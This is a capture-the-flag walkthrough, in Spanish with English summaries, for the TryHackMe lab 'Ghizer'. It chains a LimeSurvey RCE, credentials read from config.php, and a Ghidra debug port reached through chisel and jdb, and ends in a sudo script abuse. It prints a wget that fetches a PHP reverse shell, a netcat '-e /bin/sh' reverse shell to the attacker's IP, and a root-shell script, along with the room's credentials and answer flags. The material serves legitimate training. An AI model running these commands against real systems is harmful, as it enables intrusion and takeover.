# Ghizer
| **Dificultad** | Medium |
| **Tipo** | Boot2Root (Linux) |
| **Slug** | `ghizer` |
| **Link** | [TryHackMe](https://tryhackme.com/room/ghizer) |
| **Sección** | 02 Level Medium |
| **Fuente** | Web (TryHackMe room `ghizerctf` + walkthroughs públicos: krishnan-tech, Hacking Articles, infosecwriteups) |
| **Componentes** | vsftpd 3.0.3 (FTP), Apache 2.4.18 (Ubuntu), **LimeSurvey < 3.16 RCE** (exploit-db 46634), WordPress 5.4.2 + **WPS Hide Login** (`/?devtools`), credenciales en `config.php`, **Ghidra debug RCE** (puerto 18001), chisel (port forwarding), jdb, `sudo NOPASSWD` sobre `base.py` (python3.5) |
| **Impacto** | Cadena completa: se explota una **RCE de LimeSurvey** (con credenciales por defecto) para obtener shell como `www-data`, se extraen credenciales de base de datos del `config.php`, se abusa del **modo debug de Ghidra** (puerto interno 18001, reenviado con chisel + jdb) para pivotar al usuario `veronica`, y finalmente se escala a **root** borrando y recreando un script privilegiado (`base.py`) ejecutable con `sudo NOPASSWD`. |
---
**Contexto:** Ghizer es una room media de Linux con **dos servicios web**: **LimeSurvey** en el puerto 80 (vulnerable a RCE, exploit-db 46634) y un **WordPress 5.4.2** en el 443 con el login oculto por **WPS Hide Login**. Tras el reconocimiento se obtiene una shell como `www-data` explotando LimeSurvey con credenciales por defecto, se leen credenciales de la base de datos desde `config.php`, se abusa de un **servicio Ghidra en modo debug** para alcanzar a `veronica`, y se completa la escalada aprovechando un `sudo NOPASSWD` sobre un script de Python que puede borrarse y recrearse.
*EN: Ghizer is a medium Linux room featuring **two web services**: **LimeSurvey** on port 80 (RCE-vulnerable, exploit-db 46634) and a **WordPress 5.4.2** on 443 whose login is hidden by **WPS Hide Login**. After reconnaissance, a shell is obtained as `www-data` by exploiting LimeSurvey with default credentials, DB credentials are read from `config.php`, a **Ghidra service running in debug mode** is abused to reach `veronica`, and escalation is completed via a `sudo NOPASSWD` on a Python script that can be deleted and recreated.*
## Solucionario
### Task 1: Recon, Research & Exploit
**Explicación:** Toda la resolución se apoya en el reconocimiento y el *vulnerability research*.

#### Reconocimiento (nmap)
```text
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp?     vsFTPd 3.0.3
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))  [LimeSurvey]
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))  [WordPress 5.4.2]
```
- En el **puerto 80** corre **LimeSurvey** (`http-generator: LimeSurvey`).
- En el **443** corre **WordPress 5.4.2** (`Ghizer – Just another WordPress site`), con el panel de administración oculto por el plugin **WPS Hide Login**.
- El FTP anónimo no permite iniciar sesión.

#### Enumeración web
```bash
gobuster dir -u ghizer.thm -w /usr/share/wordlists/dirb/small.txt
# /admin  /application  /assets  /docs  /framework  /tests  /tmp  /upload
```
Desde `/docs/release_notes.txt` se deduce que la versión de **LimeSurvey es < 3.16** (`Changes from 3.15.8 (build 190130) to 3.15.9 (build 190214)`).

#### Ruta de administración de WordPress
El plugin **WPS Hide Login** esconde `wp-login.php`; la ruta de acceso al panel de WordPress es:
```text
/?devtools
```

#### Explotación de LimeSurvey (RCE)
Con la versión < 3.16 se localiza el exploit público (**exploit-db 46634**) y se prueban las **credenciales por defecto** de LimeSurvey (`admin:password`), que funcionan:
```bash
python2 exploit.py http://ghizer.thm admin password
# [*] Logging in to LimeSurvey...
# [*] Creating a new Survey...
# [+] SurveyID: 437327
# [*] Uploading a malicious PHAR...
# [*] Sending the Payload...
# [+] Pwned! :)
# [+] Getting the shell...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
El exploit usa un **PHAR malicioso** procesado por TCPDF (`phar://./upload/surveys/.../files/malicious.jpg`). Al ser una shell funcionalmente limitada, se sube una **reverse shell PHP** al servidor y se invoca por HTTP:
```bash
wget http://<IP_LOCAL>:8000/php_shell.php -O /var/www/html/limesurvey/php_shell.php
# GET http://<IP_VICTIMA>/php_shell.php
```

#### Credenciales en el archivo de configuración
En `/var/www/html/limesurvey/application/config/config.php` se encuentran las credenciales de la base de datos:
```php
'db' => array(
    'connectionString' => 'mysql:host=localhost;port=3306;dbname=limedb;',
    'emulatePrepare' => true,
    'username' => 'Anny',
    'password' => 'P4$W0RD!!#S3CUr3!',
    'charset' => 'utf8mb4',
    'tablePrefix' => 'lime_',
),
```
```text
Anny:P4$W0RD!!#S3CUr3!
```

#### Privilegios de usuario — Ghidra debug RCE → veronica
En el host corre un **servicio Ghidra en modo debug** en el puerto interno **18001**. Se reenvía con **chisel** y se interactúa con **jdb**:
```bash
# En la víctima
./chisel client <IP_LOCAL>:10000 R:18001:127.0.0.1:18001
# En el atacante
./chisel server -p 10000 --reverse
# jdb contra localhost:18001
> classes
> stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
# (detener el servicio y esperar unos segundos)
> print new java.lang.Runtime().exec("nc <IP_LOCAL> 9999 -e /bin/sh")
```
La reverse shell se recibe como `veronica`:
```text
uid=1000(veronica) gid=1000(veronica) groups=1000(veronica),4(adm),...,27(sudo),...
```
El flag de usuario se lee en `/home/veronica/user.txt`.

#### Escalada a root — abuso de `sudo` sobre `base.py`
```bash
veronica@ubuntu:~$ sudo -l
User veronica may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
```
`base.py` pertenece a `root` y no se puede editar, pero **sí se puede borrar**. Se elimina y se recrea con una shell:
```bash
rm base.py                                  # confirmar y (y) borrar aunque esté protegido
echo 'import pty; pty.spawn("/bin/sh")' > /home/veronica/base.py
sudo /usr/bin/python3.5 /home/veronica/base.py
# # whoami
# root
```
Con shell de root se lee `/root/root.txt`.
*EN: Full chain: LimeSurvey <3.16 RCE with default creds (admin:password) → www-data shell → DB credentials (Anny) from config.php → Ghidra debug service on port 18001 reached via chisel + jdb (WatchManager$WatchRunnable) → shell as veronica and user flag → privilege escalation by deleting and recreating the root-owned `/home/veronica/base.py`, which is runnable via sudo NOPASSWD with python3.5 → root and root flag.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What are the credentials you found in the configuration file? | `Anny:P4$W0RD!!#S3CUr3!` |
| 2 | What is the login path for the wordpress installation? | `/?devtools` |
| 3 | Compromise the machine and locate user.txt | `THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}` |
| 4 | Escalate privileges and obtain root.txt | `THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}` |
---
**Metodología:** Reconocimiento (nmap/gobuster) → fingerprint de LimeSurvey (<3.16) y WordPress → WPS Hide Login (`/?devtools`) → RCE de LimeSurvey (exploit-db 46634, creds por defecto) → credenciales de BD en `config.php` → abuso de Ghidra debug (18001) vía chisel + jdb → shell como `veronica` + user flag → abuso de `sudo NOPASSWD` sobre `base.py` → root flag.
**Learning chain:** enumerar servicios web → identificar versiones vulnerables → obtener shell inicial → extraer credenciales de ficheros de configuración → pivotar abusando de un servicio de depuración expuesto → escalar por configuración deficiente de `sudo`.
**Lección:** *Aplicaciones con credenciales por defecto (LimeSurvey), archivos de configuración legibles (`config.php`), servicios de depuración expuestos internamente (Ghidra/18001) y scripts sudo editables/borrables encadenan un compromiso total del sistema.*
**MITRE ATT&CK:** T1046 (Network Service Discovery), T1595 (Active Scanning), T1190 (Exploit Public-Facing Application), T1078.001 (Default Accounts), T1552.001 (Credentials In Files), T1059.006 (Python) / T1059.007 (JavaScript), T1548.003 (Sudo and Sudo Caching), T1005 (Data from Local System).
**Fuente:** [TryHackMe - Ghizer](https://tryhackme.com/room/ghizer)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
